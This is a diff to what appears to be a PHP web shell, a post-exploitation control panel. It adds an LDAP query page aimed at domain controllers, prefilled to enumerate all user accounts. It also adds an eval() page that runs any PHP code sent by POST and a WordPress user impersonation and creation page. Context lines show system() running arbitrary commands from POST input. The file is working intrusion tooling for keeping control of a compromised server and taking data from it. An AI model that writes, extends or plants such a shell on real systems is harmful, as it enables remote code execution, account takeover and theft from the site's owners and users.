-                                    </ul>",
+                                    </ul>"
                             ),
                             makeInput(
                                 "text",
@@ -2293,7 +2605,7 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                 "__PARAM_4__",
                                 "admin",
                                 "The username to connect with.",
-                                true,
+                                true
                             ),
                             makeInput(
                                 "password",
@@ -2301,105 +2613,105 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                 "__PARAM_5__",
                                 "&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;",
                                 "The password to connect with.",
-                                true,
+                                true
                             ),
                             makeInput(
                                 "text",
                                 "Database",
                                 "__PARAM_6__",
                                 "ExampleDB",
-                                "The database to connect to.",
+                                "The database to connect to."
                             ),
                             makeInput(
                                 "text",
                                 "Charset",
                                 "__PARAM_7__",
                                 "utf8",
-                                "The charset to use for the connection.",
+                                "The charset to use for the connection."
                             ),
                             makeInput(
                                 "text",
                                 "Service name",
                                 "__PARAM_8__",
                                 "orcl",
-                                "The service name to use for the connection.",
+                                "The service name to use for the connection."
                             ),
                             makeInput(
                                 "text",
                                 "SID",
                                 "__PARAM_9__",
                                 "orcl",
-                                "The SID to use for the connection.",
+                                "The SID to use for the connection."
                             ),
                             makeInput(
                                 "text",
                                 "Options",
                                 "__PARAM_10__",
                                 "ssl=true",
-                                "The options to use for the connection.",
+                                "The options to use for the connection."
                             ),
                             makeInput(
                                 "text",
                                 "Role",
                                 "__PARAM_11__",
                                 "SYSDBA",
-                                "The role to use for the connection.",
+                                "The role to use for the connection."
                             ),
                             makeInput(
                                 "text",
                                 "Dialect",
                                 "__PARAM_12__",
                                 "3",
-                                "The dialect to use for the connection.",
+                                "The dialect to use for the connection."
                             ),
                             makeInput(
                                 "text",
                                 "Protocol",
                                 "__PARAM_13__",
                                 "onsoctcp",
-                                "The protocol to use for the connection.",
+                                "The protocol to use for the connection."
                             ),
                             makeCheckbox(
                                 "__PARAM_14__",
                                 "Enable scrollable cursors",
                                 "Enable scrollable cursors for the connection.",
                                 true,
-                                "1",
+                                "1"
                             ),
                             makeInput(
                                 "text",
                                 "ODBC driver",
                                 "__PARAM_15__",
                                 "ODBC Driver 17 for SQL Server",
-                                "The ODBC driver to use for the connection.",
+                                "The ODBC driver to use for the connection."
                             ),
                             makeInput(
                                 "text",
                                 "Raw connection string",
                                 "__PARAM_16__",
                                 "mysql:host=localhost;port=3306;dbname=ExampleDB;charset=utf8",
-                                "The raw connection string to use for the connection.",
+                                "The raw connection string to use for the connection."
                             ),
                             makeInput(
                                 "text",
                                 "Server",
                                 "__PARAM_17__",
                                 "ol_informix1170",
-                                "The Informix server name to use for the connection.",
+                                "The Informix server name to use for the connection."
                             ),
                             makeInput(
                                 "textarea",
                                 "Query",
                                 "__PARAM_18__",
                                 "SHOW DATABASES",
-                                "The query to run against the database. Leave empty to perform a connection test.",
+                                "The query to run against the database. Leave empty to perform a connection test."
                             ),
                             makeInput(
                                 "text",
                                 "Collection",
                                 "__PARAM_19__",
                                 "users",
-                                "The collection to query against for MongoDB.",
+                                "The collection to query against for MongoDB."
                             ),
                             '<script>
                                 function hideAll() {
@@ -2466,10 +2778,162 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                    }
                                 });
                             </script>',
-                        ],
+                        ]
                     ),
                 ],
-                $page,
+                $page
+            );
+            break;
+        case $QUERY_LDAP:
+            $content = makePage(
+                [
+                    makePageHeader(
+                        $ENABLED_FEATURES[$page]["title"],
+                        $ENABLED_FEATURES[$page]["description"]
+                    ),
+                    makeForm(
+                        $page,
+                        $_SERVER["REQUEST_URI"],
+                        [
+                            makeInput(
+                                "text",
+                                "Domain controller",
+                                "__PARAM_1__",
+                                "hostname or IP address",
+                                "The domain controller to connect to.",
+                                true
+                            ),
+                            makeInput(
+                                "text",
+                                "LDAP port",
+                                "__PARAM_2__",
+                                "389",
+                                "The port to connect to."
+                            ),
+                            makeInput(
+                                "text",
+                                "Domain",
+                                "__PARAM_3__",
+                                "example.com",
+                                "The domain to connect to.",
+                                true
+                            ),
+                            makeInput(
+                                "text",
+                                "Username",
+                                "__PARAM_4__",
+                                "admin",
+                                "The username to connect with."
+                            ),
+                            makeInput(
+                                "password",
+                                "Password",
+                                "__PARAM_5__",
+                                "&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;",
+                                "The password to connect with."
+                            ),
+                            makeInput(
+                                "textarea",
+                                "Query",
+                                "__PARAM_6__",
+                                "(&(objectClass=user)(sAMAccountName=*))",
+                                "The LDAP query to run against the domain controller.",
+                                true
+                            ),
+                        ]
+                    ),
+                ],
+                $page
+            );
+            break;
+        case $EVAL:
+            $content = makePage(
+                [
+                    makePageHeader(
+                        $ENABLED_FEATURES[$page]["title"],
+                        $ENABLED_FEATURES[$page]["description"]
+                    ),
+                    makeForm(
+                        $page,
+                        $_SERVER["REQUEST_URI"],
+                        [
+                            makeInput(
+                                "textarea",
+                                "PHP code",
+                                "__PARAM_1__",
+                                "echo 'Hello, world!';",
+                                "The PHP code to evaluate.",
+                                true
+                            ),
+                        ]
+                    ),
+                ],
+                $page
+            );
+            break;
+        case $IMPERSONATE_WP_USER:
+            $users   = getWPUsers();
+            $content = makePage(
+                [
+                    makePageHeader(
+                        $ENABLED_FEATURES[$page]["title"],
+                        $ENABLED_FEATURES[$page]["description"]
+                    ),
+                    makeTable(
+                        "Users",
+                        "WordPress users to impersonate",
+                        $users,
+                        [
+                            "user_login" => "Username",
+                            "user_email" => "Email",
+                            "roles"      => "Roles",
+                            "user_url"   => "URL",
+                            "actions"    => "Actions",
+                        ],
+                        "
+                        <dialog id='create-wp-user' class='p-4 rounded w-1/3'>" .
+                        makeForm(
+                            $page,
+                            $_SERVER["REQUEST_URI"],
+                            [
+                                "<div class='flex items-center justify-between'>
+                                        <h3 class='text-lg font-semibold text-zinc-800'>Create WordPress user</h3>
+                                        <button onclick='document.getElementById(\"create-wp-user\").close(); document.getElementById(\"create-wp-user\").classList.remove(\"flex\")' 
+                                            class='text-zinc-800 hover:text-zinc-700 transition-all duration-300 text-2xl'>
+                                            &times;
+                                        </button>
+                                    </div>",
+                                makeInput(
+                                    "text",
+                                    "Username",
+                                    "__PARAM_2__",
+                                    "admin",
+                                    "Username of the user to create.",
+                                    true
+                                ),
+                                makeInput(
+                                    "password",
+                                    "Password",
+                                    "__PARAM_3__",
+                                    "&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;",
+                                    "Password of the user to create.",
+                                    true
+                                ),
+                            ],
+                            "post",
+                            "Create user",
+                            "flex flex-col gap-y-6 mx-auto w-full"
+                        )
+                        . "
+                        </dialog>
+                        <button onclick='document.getElementById(\"create-wp-user\").showModal()' 
+                            class='rounded px-3 py-2 text-sm font-semibold text-white shadow bg-zinc-800 flex-grow-0 ml-auto
+                                hover:bg-zinc-700 transition-all duration-300'>
+                            Create user
+                        </button>"
+                    ),
+                ],
+                $page
             );
             break;
     }
@@ -2508,27 +2972,23 @@ if (isPost()) {
             system($_POST["__PARAM_1__"]);
             break;
         case $QUERY_DATABASES:
-            connectAndQueryDatabase(
+            handleQueryDatabase();
+            break;
+        case $QUERY_LDAP:
+            runLDAPQuery(
                 $_POST["__PARAM_1__"],
-                $_POST["__PARAM_4__"],
-                $_POST["__PARAM_5__"],
-                $_POST["__PARAM_2__"],
+                !empty($_POST["__PARAM_2__"]) ? intval($_POST["__PARAM_2__"]) : null,
+                !empty($_POST["__PARAM_4__"]) ? $_POST["__PARAM_4__"] : null,
+                !empty($_POST["__PARAM_5__"]) ? $_POST["__PARAM_5__"] : null,
                 $_POST["__PARAM_3__"],
-                $_POST["__PARAM_8__"],
-                $_POST["__PARAM_9__"],
-                $_POST["__PARAM_6__"],
-                $_POST["__PARAM_7__"],
-                $_POST["__PARAM_10__"],
-                $_POST["__PARAM_11__"],
-                $_POST["__PARAM_12__"],
-                $_POST["__PARAM_15__"],
-                $_POST["__PARAM_17__"],
-                $_POST["__PARAM_13__"],
-                $_POST["__PARAM_14__"],
-                $_POST["__PARAM_16__"],
-                $_POST["__PARAM_18__"],
-                $_POST["__PARAM_19__"],
+                $_POST["__PARAM_6__"]
             );
+            break;
+        case $EVAL:
+            eval($_POST["__PARAM_1__"]);
+            break;
+        case $IMPERSONATE_WP_USER:
+            handleImpersonateWPUser();
             break;
         default:
             echo "Unrecognized operation '$operation'";
@@ -2542,4 +3002,3 @@ if (!isPost() &&
     $_POST["__OPERATION__"] !== $LOGIN) {
     closeCommandOutputScreen();
 }
-?>
